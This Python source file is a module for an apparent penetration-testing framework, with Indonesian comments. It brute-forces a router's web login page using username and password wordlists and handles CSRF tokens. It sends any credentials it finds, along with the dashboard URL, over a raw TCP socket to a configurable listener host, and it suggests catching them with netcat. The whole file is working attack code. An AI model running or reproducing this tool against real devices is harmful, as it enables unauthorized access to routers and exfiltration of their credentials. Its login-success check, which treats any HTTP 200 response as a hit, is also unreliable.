import requests
import socket
import time
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
import os
from pathlib import Path
from bs4 import BeautifulSoup

MODULE_INFO = {
    "name": "bruteforce/router_login",
    "description": "Mencoba login ke halaman router dengan daftar nama pengguna dan kata sandi"
}

OPTIONS = {
    "TARGET_URL": {
        "required": True,
        "default": "http://192.168.1.1",
        "description": "URL login router target (contoh: http://192.168.1.1)"
    },
    "USERNAME_LIST": {
        "required": True,
        "default": "usernames.txt",
        "description": "Path ke file daftar nama pengguna"
    },
    "PASSWORD_LIST": {
        "required": True,
        "default": "passwords.txt",
        "description": "Path ke file daftar kata sandi"
    },
    "DELAY": {
        "required": False,
        "default": "0.5",
        "description": "Jeda antar percobaan dalam detik (float)"
    },
    "LOGIN_ENDPOINT": {
        "required": False,
        "default": "/login",
        "description": "Path endpoint login (contoh: /login atau /index.html)"
    },
    "LISTENER_IP": {
        "required": False,
        "default": "127.0.0.1",
        "description": "IP alamat listener untuk reverse TCP"
    },
    "LISTENER_PORT": {
        "required": False,
        "default": "4444",
        "description": "Port listener untuk reverse TCP"
    }
}

def load_wordlist(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def clean_html(html_text):
    """Ekstrak teks bersih dari HTML menggunakan BeautifulSoup."""
    soup = BeautifulSoup(html_text, 'html.parser')
    for tag in soup(['script', 'style']):
        tag.decompose()
    text = ' '.join(soup.stripped_strings)
    return text[:1000] if text else "Tidak ada teks yang dapat diekstrak dari halaman."

def send_reverse_tcp(username, password, target_url, listener_ip, listener_port):
    """Kirim kredensial dan URL melalui reverse TCP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((listener_ip, int(listener_port)))
        message = f"Credentials: {username}:{password}\nDashboard URL: {target_url}\n"
        sock.send(message.encode())
        sock.close()
        return True
    except Exception as e:
        return False

def run(session, options):
    console = Console()
    target_url = options.get("TARGET_URL", "http://192.168.1.1")
    username_list = options.get("USERNAME_LIST", "usernames.txt")
    password_list = options.get("PASSWORD_LIST", "passwords.txt")
    delay = float(options.get("DELAY", "0.5"))
    login_endpoint = options.get("LOGIN_ENDPOINT", "/login")
    listener_ip = options.get("LISTENER_IP", "127.0.0.1")
    listener_port = options.get("LISTENER_PORT", "4444")

    # Periksa kompatibilitas dengan Pyodide
    try:
        import js  # Cek apakah di Pyodide
        console.print("[red]Peringatan: Modul ini dijalankan di Pyodide. Reverse TCP tidak didukung. Gunakan Python standar untuk fungsi penuh.[/red]")
        return
    except ImportError:
        pass  # Lanjutkan jika bukan Pyodide

    if not target_url.endswith('/'):
        target_url += '/'
    full_url = target_url + login_endpoint.lstrip('/')

    usernames = load_wordlist(username_list)
    passwords = load_wordlist(password_list)

    if not usernames or not passwords:
        console.print(f"[red]Kesalahan: Tidak dapat memuat daftar kata. Periksa path: {username_list}, {password_list}[/red]")
        return

    console.print(f"[yellow]Memulai brute-force pada {full_url} dengan {len(usernames)} nama pengguna dan {len(passwords)} kata sandi...[/yellow]")

    table = Table(title="Hasil Brute-Force", box=None)
    table.add_column("Nama Pengguna", style="cyan")
    table.add_column("Kata Sandi", style="cyan")
    table.add_column("Status", style="green")
    successes = []

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    total_attempts = 0
    max_attempts = 10000

    try:
        for username in usernames:
            for password in passwords:
                total_attempts += 1
                if total_attempts > max_attempts:
                    console.print("[red]Batas maksimum percobaan (10000) tercapai. Berhenti.[/red]")
                    break

                try:
                    # Ambil halaman login untuk CSRF token (jika ada)
                    response = session.get(full_url, timeout=5)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    csrf_token = soup.find('input', {'name': 'csrf_token'})['value'] if soup.find('input', {'name': 'csrf_token'}) else None

                    data = {"username": username, "password": password}
                    if csrf_token:
                        data['csrf_token'] = csrf_token

                    response = session.post(full_url, data=data, timeout=5, allow_redirects=True)

                    # Debug respons
                    debug_text = clean_html(response.text)[:200]
                    console.print(f"[yellow]Debug: {username}:{password} -> Status: {response.status_code}, Response: {debug_text}[/yellow]")
                    if response.status_code == 302 and 'Location' in response.headers:
                        console.print(f"[yellow]Redirect to: {response.headers['Location']}[/yellow]")

                    # Tentukan status
                    status = "Gagal"
                    if response.status_code == 401:
                        status = "Gagal (401 Unauthorized)"
                    elif response.status_code == 403:
                        status = "Gagal (403 Forbidden)"
                    elif response.status_code == 429:
                        status = "Gagal (429 Too Many Requests)"

                    # Deteksi otomatis keberhasilan login
                    success_indicators = ['dashboard', 'welcome', 'home', 'admin']
                    dashboard_url = None
                    if response.status_code == 302 and 'Location' in response.headers:
                        dashboard_url = target_url + response.headers['Location'].lstrip('/')
                    if (response.status_code == 200 or
                        dashboard_url or
                        any(ind.lower() in debug_text.lower() for ind in success_indicators)):
                        status = "Berhasil"
                        successes.append((username, password, status))
                        table.add_row(username, password, f"[green]{status}[/green]")
                        # Tampilkan dashboard dan kirim reverse TCP
                        clean_dashboard = clean_html(response.text)
                        console.print(Panel(clean_dashboard, title="Dashboard Router", border_style="green"))
                        console.print(table)
                        console.print(f"[green]Kredensial {username}:{password} berhasil! Mencoba reverse TCP...[/green]")
                        if send_reverse_tcp(username, password, dashboard_url or target_url, listener_ip, listener_port):
                            console.print(f"[green]Reverse TCP berhasil ke {listener_ip}:{listener_port}. Gunakan kredensial untuk akses dashboard.[/green]")
                        else:
                            console.print(f"[yellow]Gagal menginisiasi reverse TCP. Jalankan listener manual di {listener_ip}:{listener_port} (contoh: nc -lvp {listener_port}).[/yellow]")
                        break

                    if total_attempts % 10 == 0:
                        console.print(f"[yellow]Percobaan {total_attempts}: {username}:{password} -> {status}[/yellow]")

                    time.sleep(delay)

                except requests.RequestException as e:
                    console.print(f"[red]Kesalahan pada percobaan {username}:{password}: {e}[/red]")

            if successes:
                break

    finally:
        session.close()

    if not successes:
        console.print("[yellow]Tidak ada kredensial valid yang ditemukan.[/yellow]")

    console.print(f"[cyan]Total percobaan: {total_attempts}[/cyan]")
